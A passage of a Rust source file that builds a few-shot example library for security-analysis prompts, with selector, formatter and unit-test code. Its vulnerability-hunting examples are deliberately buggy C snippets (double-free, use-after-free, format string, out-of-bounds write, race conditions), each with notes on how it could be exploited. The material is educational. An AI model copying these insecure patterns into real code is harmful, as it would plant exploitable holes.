                "void handler(int sig) {\n    free(global_ptr);\n}\n// main: signal(SIGTERM, handler);\n//       free(global_ptr);  <- also called from main",
                "1. global_ptr is freed in main.\n2. Signal handler also frees global_ptr.\n3. If SIGTERM fires between malloc and the main-thread free, the pointer is freed twice.\n4. Double-free can lead to heap corruption and potentially code execution.",
                "Double-free via signal race condition — async signal handler frees a pointer already freed by main.",
            ).tag("double-free").tag("signal").tag("race-condition").with_difficulty(4),

            FewShotExample::new(
                "vuln-004",
                ExampleCategory::VulnerabilityHunting,
                "char *ptr = malloc(64);\n// ... error path ...\nif (condition) { free(ptr); return; }\n// ... use ptr ...\nfree(ptr);",
                "1. Early return frees ptr.\n2. Code continues to the second free at function end.\n3. If condition was true, ptr is freed twice — double-free.",
                "Double-free on error path — early return frees pointer that is freed again at end of function.",
            ).tag("double-free").tag("error-handling").with_difficulty(2),

            FewShotExample::new(
                "vuln-005",
                ExampleCategory::VulnerabilityHunting,
                "int idx = user_input();\nbuf[idx] = value;",
                "1. idx comes from user input — no bounds check.\n2. If idx is negative or >= sizeof(buf), out-of-bounds write occurs.\n3. Negative idx can write before buf (if buf is on stack, attacker can overwrite saved RIP).",
                "Out-of-bounds array write — unchecked user-controlled index, potential arbitrary write.",
            ).tag("oob-write").tag("array").tag("user-input").with_difficulty(2),

            FewShotExample::new(
                "vuln-006",
                ExampleCategory::VulnerabilityHunting,
                "sprintf(buf, format_string_from_user);",
                "1. format_string_from_user is user-controlled and passed directly as the format argument.\n2. Attacker can use %n to write to arbitrary addresses, or %s to read stack memory.\n3. This is a format string vulnerability.",
                "Format string vulnerability — user-controlled format string passed to sprintf allows arbitrary read/write.",
            ).tag("format-string").tag("printf").with_difficulty(2),

            FewShotExample::new(
                "vuln-007",
                ExampleCategory::VulnerabilityHunting,
                "void *ptr = malloc(n);\nif (some_error) { free(ptr); }\n// ptr is returned or stored but the error flag isn't propagated properly\nptr->field = 5;  // use after free if some_error was true",
                "1. ptr is freed on error but then dereferenced.\n2. The freed memory may have been reallocated to different object.\n3. Writing to freed memory is use-after-free — exploitable for type confusion.",
                "Use-after-free — freed pointer dereferenced after conditional free in error path.",
            ).tag("use-after-free").tag("heap").with_difficulty(3),

            FewShotExample::new(
                "vuln-008",
                ExampleCategory::VulnerabilityHunting,
                "uint8_t *p = buf;\nwhile (p < buf + len) {\n    uint16_t field_len = *(uint16_t*)p;\n    p += 2 + field_len;  // potential to overshoot if field_len is huge\n}",
                "1. field_len is read from untrusted data.\n2. p += 2 + field_len can overshoot buf + len.\n3. The while condition is checked after advancing — heap read out of bounds.",
                "Heap out-of-bounds read via crafted field length — missing overflow/bounds check in TLV parser.",
            ).tag("oob-read").tag("parsing").tag("tlv").with_difficulty(3),

            FewShotExample::new(
                "vuln-009",
                ExampleCategory::VulnerabilityHunting,
                "// Thread 1: obj->counter++;\n// Thread 2: if (obj->counter > 0) { use(obj); free(obj); }",
                "1. Thread 1 may increment counter after Thread 2 checks it.\n2. Thread 2 may free obj while Thread 1 is still using it.\n3. Classic TOCTOU (time-of-check / time-of-use) race condition leading to use-after-free.",
                "TOCTOU race condition — concurrent access to object leads to use-after-free.",
            ).tag("race-condition").tag("toctou").tag("concurrency").with_difficulty(4),

            FewShotExample::new(
                "vuln-010",
                ExampleCategory::VulnerabilityHunting,
                "strncat(dest, src, sizeof(dest));",
                "1. strncat's third argument should be remaining space, not total size.\n2. sizeof(dest) doesn't account for existing content in dest.\n3. If dest already has N bytes, strncat can write sizeof(dest) more — overflow.",
                "Off-by-one / strncat misuse — sizeof instead of remaining space allows overflow.",
            ).tag("buffer-overflow").tag("strncat").tag("off-by-one").with_difficulty(2),
        ];
        for e in examples {
            self.add(e);
        }
    }
}

// ─── ExampleSelector ─────────────────────────────────────────────────────────

/// Selection options for picking relevant examples.
#[derive(Debug, Clone, Default)]
pub struct SelectionOptions {
    /// Restrict to a specific category.
    pub category: Option<ExampleCategory>,
    /// Maximum difficulty to include.
    pub max_difficulty: Option<u8>,
    /// Required tags (all must be present).
    pub required_tags: Vec<String>,
    /// Maximum number of examples to return.
    pub max_count: usize,
}

/// Selects the most relevant examples from a library given a query.
pub struct ExampleSelector;

impl ExampleSelector {
    /// Select up to `opts.max_count` examples most similar to `query`.
    #[must_use] 
    pub fn select<'a>(
        library: &'a ExampleLibrary,
        query: &str,
        opts: &SelectionOptions,
    ) -> Vec<&'a FewShotExample> {
        let max_count = if opts.max_count == 0 {
            5
        } else {
            opts.max_count
        };

        let mut candidates: Vec<&FewShotExample> = library.examples.values().collect();

        // Category filter.
        if let Some(cat) = opts.category {
            candidates.retain(|e| e.category == cat);
        }

        // Difficulty filter.
        if let Some(max_d) = opts.max_difficulty {
            candidates.retain(|e| e.difficulty <= max_d);
        }

        // Required tags filter.
        for tag in &opts.required_tags {
            candidates.retain(|e| e.tags.iter().any(|t| t == tag));
        }

        // Score by similarity.
        let mut scored: Vec<(&FewShotExample, f64)> = candidates
            .into_iter()
            .map(|e| {
                let sim = e.similarity_to(query);
                (e, sim)
            })
            .collect();

        // Sort descending by score; break ties by difficulty ascending (simpler first).
        scored.sort_by(|a, b| {
            b.1.partial_cmp(&a.1)
                .unwrap()
                .then(a.0.difficulty.cmp(&b.0.difficulty))
        });

        scored.into_iter().take(max_count).map(|(e, _)| e).collect()
    }
}

// ─── ExampleFormatter ────────────────────────────────────────────────────────

/// Output formats for few-shot examples.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FormatterStyle {
    /// Numbered sections with headers.
    Structured,
    /// Q/A style.
    QA,
    /// Plain concatenation.
    Plain,
    /// XML-tagged (for models that parse XML delimiters).
    Xml,
}

/// Formats selected examples into a prompt string.
pub struct ExampleFormatter;

impl ExampleFormatter {
    /// Format a list of examples as a prompt.
    #[must_use] 
    pub fn format(examples: &[&FewShotExample], style: FormatterStyle) -> String {
        match style {
            FormatterStyle::Structured => Self::format_structured(examples),
            FormatterStyle::QA => Self::format_qa(examples),
            FormatterStyle::Plain => Self::format_plain(examples),
            FormatterStyle::Xml => Self::format_xml(examples),
        }
    }

    fn format_structured(examples: &[&FewShotExample]) -> String {
        let mut out = String::from("## Few-Shot Examples\n\n");
        for (i, ex) in examples.iter().enumerate() {
            let _ = write!(out, "### Example {} ({})\n\n", i + 1, ex.category);
            out.push_str("**Input:**\n```\n");
            out.push_str(&ex.input);
            out.push_str("\n```\n\n**Reasoning:**\n");
            out.push_str(&ex.reasoning);
            out.push_str("\n\n**Output:**\n");
            out.push_str(&ex.output);
            out.push_str("\n\n---\n\n");
        }
        out
    }

    fn format_qa(examples: &[&FewShotExample]) -> String {
        let mut out = String::new();
        for ex in examples {
            out.push_str("Q: Analyse the following:\n");
            out.push_str(&ex.input);
            out.push_str("\n\nA: ");
            out.push_str(&ex.output);
            out.push_str("\n\n");
        }
        out
    }

    fn format_plain(examples: &[&FewShotExample]) -> String {
        let mut out = String::new();
        for ex in examples {
            out.push_str(&ex.input);
            out.push_str("\n→ ");
            out.push_str(&ex.output);
            out.push('\n');
        }
        out
    }

    fn format_xml(examples: &[&FewShotExample]) -> String {
        let mut out = String::from("<examples>\n");
        for ex in examples {
            out.push_str("  <example id=\"");
            out.push_str(&ex.id);
            out.push_str("\">\n    <input><![CDATA[");
            out.push_str(&ex.input);
            out.push_str("]]></input>\n    <reasoning><![CDATA[");
            out.push_str(&ex.reasoning);
            out.push_str("]]></reasoning>\n    <output><![CDATA[");
            out.push_str(&ex.output);
            out.push_str("]]></output>\n  </example>\n");
        }
        out.push_str("</examples>");
        out
    }
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn library_defaults_has_50_plus() {
        let lib = ExampleLibrary::with_defaults();
        assert!(lib.len() >= 50, "Expected ≥50 examples, got {}", lib.len());
    }

    #[test]
    fn library_empty_initially() {
        let lib = ExampleLibrary::new();
        assert!(lib.is_empty());
    }

    #[test]
    fn library_add_get() {
        let mut lib = ExampleLibrary::new();
        let ex = FewShotExample::new(
            "t1",
            ExampleCategory::AssemblyAnalysis,
            "MOV EAX, 1",
            "...",
            "set EAX to 1",
        );
        lib.add(ex);
        assert!(lib.get("t1").is_some());
        assert!(lib.get("t99").is_none());
    }

    #[test]
    fn library_by_category() {
        let lib = ExampleLibrary::with_defaults();
        let asm = lib.by_category(ExampleCategory::AssemblyAnalysis);
        assert!(!asm.is_empty());
        for e in &asm {
            assert_eq!(e.category, ExampleCategory::AssemblyAnalysis);
        }
    }

    #[test]
    fn library_by_tag() {
        let lib = ExampleLibrary::with_defaults();
        let xor_examples = lib.by_tag("xor");
        assert!(!xor_examples.is_empty());
    }

    #[test]
    fn library_by_max_difficulty() {
        let lib = ExampleLibrary::with_defaults();
        let easy = lib.by_max_difficulty(1);
        assert!(!easy.is_empty());
        for e in &easy {
            assert!(e.difficulty <= 1);
        }
    }

    #[test]
    fn example_similarity_exact_match() {
        let ex = FewShotExample::new(
            "t",
            ExampleCategory::AssemblyAnalysis,
            "MOV EAX EBX",
            "r",
            "out",
        )
        .tag("x86");
        let sim = ex.similarity_to("MOV EAX EBX x86");
        assert!(sim > 0.5);
    }

    #[test]
    fn example_similarity_no_overlap() {
        let ex = FewShotExample::new(
            "t",
            ExampleCategory::AssemblyAnalysis,
            "MOV EAX EBX",
            "r",
            "out",
        );
        let sim = ex.similarity_to("crypto aes sha256");
        assert_eq!(sim, 0.0);
    }

    #[test]
    fn example_tag_method() {
        let ex = FewShotExample::new("t", ExampleCategory::MalwareAnalysis, "inp", "r", "out")
            .tag("windows")
            .tag("shellcode");
        assert_eq!(ex.tags.len(), 2);
    }

    #[test]
    fn example_difficulty_clamp() {
        let ex = FewShotExample::new("t", ExampleCategory::MalwareAnalysis, "", "", "")
            .with_difficulty(99);
        assert_eq!(ex.difficulty, 5);
    }

    #[test]
    fn selector_returns_at_most_n() {
        let lib = ExampleLibrary::with_defaults();
        let opts = SelectionOptions {
            max_count: 3,
            ..Default::default()
        };
        let results = ExampleSelector::select(&lib, "assembly x86", &opts);
        assert!(results.len() <= 3);
    }

    #[test]
    fn selector_category_filter() {
        let lib = ExampleLibrary::with_defaults();
        let opts = SelectionOptions {
            category: Some(ExampleCategory::MalwareAnalysis),
            max_count: 10,
            ..Default::default()
        };
        let results = ExampleSelector::select(&lib, "malware", &opts);
        for r in &results {
            assert_eq!(r.category, ExampleCategory::MalwareAnalysis);
        }
    }

    #[test]
    fn selector_max_difficulty_filter() {
        let lib = ExampleLibrary::with_defaults();
        let opts = SelectionOptions {
            max_difficulty: Some(2),
            max_count: 20,
            ..Default::default()
        };
        let results = ExampleSelector::select(&lib, "x86", &opts);
        for r in &results {
            assert!(r.difficulty <= 2);
        }
    }

    #[test]
    fn selector_required_tag_filter() {
        let lib = ExampleLibrary::with_defaults();
        let opts = SelectionOptions {
            required_tags: vec!["aes".to_string()],
            max_count: 10,
            ..Default::default()
        };
        let results = ExampleSelector::select(&lib, "aes encryption", &opts);
        for r in &results {
            assert!(r.tags.contains(&"aes".to_string()));
        }
    }

    #[test]
    fn selector_default_max_count_5() {
        let lib = ExampleLibrary::with_defaults();
        let opts = SelectionOptions::default(); // max_count = 0 → defaults to 5
        let results = ExampleSelector::select(&lib, "x86 assembly", &opts);
        assert!(results.len() <= 5);
    }

    #[test]
    fn formatter_structured_contains_headers() {
        let lib = ExampleLibrary::with_defaults();
        let ex = lib.get("asm-001").unwrap();
        let formatted = ExampleFormatter::format(&[ex], FormatterStyle::Structured);
        assert!(formatted.contains("## Few-Shot Examples"));
        assert!(formatted.contains("**Input:**"));
        assert!(formatted.contains("**Output:**"));
    }

    #[test]
    fn formatter_qa_style() {
        let lib = ExampleLibrary::with_defaults();
        let ex = lib.get("asm-001").unwrap();
        let formatted = ExampleFormatter::format(&[ex], FormatterStyle::QA);
        assert!(formatted.contains("Q:"));
        assert!(formatted.contains("A:"));
    }

    #[test]
    fn formatter_plain_style() {
        let lib = ExampleLibrary::with_defaults();
        let ex = lib.get("mal-001").unwrap();
        let formatted = ExampleFormatter::format(&[ex], FormatterStyle::Plain);
        assert!(formatted.contains('→'));
    }

    #[test]
    fn formatter_xml_style() {
        let lib = ExampleLibrary::with_defaults();
        let ex = lib.get("cry-001").unwrap();
        let formatted = ExampleFormatter::format(&[ex], FormatterStyle::Xml);
        assert!(formatted.contains("<examples>"));
        assert!(formatted.contains("<input>"));
        assert!(formatted.contains("</examples>"));
    }

    #[test]
    fn all_asm_examples_present() {
        let lib = ExampleLibrary::with_defaults();
        for id in &[
            "asm-001", "asm-002", "asm-003", "asm-004", "asm-005", "asm-006", "asm-007", "asm-008",
            "asm-009", "asm-010",
        ] {
            assert!(lib.get(id).is_some(), "missing {id}");
        }
    }

    #[test]
    fn all_malware_examples_present() {
        let lib = ExampleLibrary::with_defaults();
        for id in &[
            "mal-001", "mal-002", "mal-003", "mal-004", "mal-005", "mal-006", "mal-007", "mal-008",
            "mal-009", "mal-010",
        ] {
            assert!(lib.get(id).is_some(), "missing {id}");
        }
    }

    #[test]
    fn all_crypto_examples_present() {
        let lib = ExampleLibrary::with_defaults();
        for id in &[
            "cry-001", "cry-002", "cry-003", "cry-004", "cry-005", "cry-006", "cry-007", "cry-008",
            "cry-009", "cry-010", "cry-011", "cry-012",
        ] {
            assert!(lib.get(id).is_some(), "missing {id}");
        }
    }

    #[test]
    fn all_protocol_examples_present() {
        let lib = ExampleLibrary::with_defaults();
        for id in &[
            "proto-001",
            "proto-002",
            "proto-003",
            "proto-004",
            "proto-005",
            "proto-006",
            "proto-007",
            "proto-008",
        ] {
            assert!(lib.get(id).is_some(), "missing {id}");
        }
    }

    #[test]
    fn all_vuln_examples_present() {
        let lib = ExampleLibrary::with_defaults();
        for id in &[
            "vuln-001", "vuln-002", "vuln-003", "vuln-004", "vuln-005", "vuln-006", "vuln-007",
            "vuln-008", "vuln-009", "vuln-010",
        ] {
            assert!(lib.get(id).is_some(), "missing {id}");
        }
    }

    #[test]
    fn example_error_display() {
        let e = ExampleError::ExampleNotFound("x".into());
        assert!(e.to_string().contains("example not found"));
    }

    #[test]
    fn category_display() {
        assert_eq!(
            ExampleCategory::AssemblyAnalysis.to_string(),
            "assembly_analysis"
        );
        assert_eq!(
            ExampleCategory::MalwareAnalysis.to_string(),
            "malware_analysis"
        );
    }

    #[test]
    fn example_with_source() {
        let ex = FewShotExample::new("t", ExampleCategory::AssemblyAnalysis, "", "", "")
            .with_source("crackmes.one sample ABC");
        assert!(ex.source.is_some());
    }
}
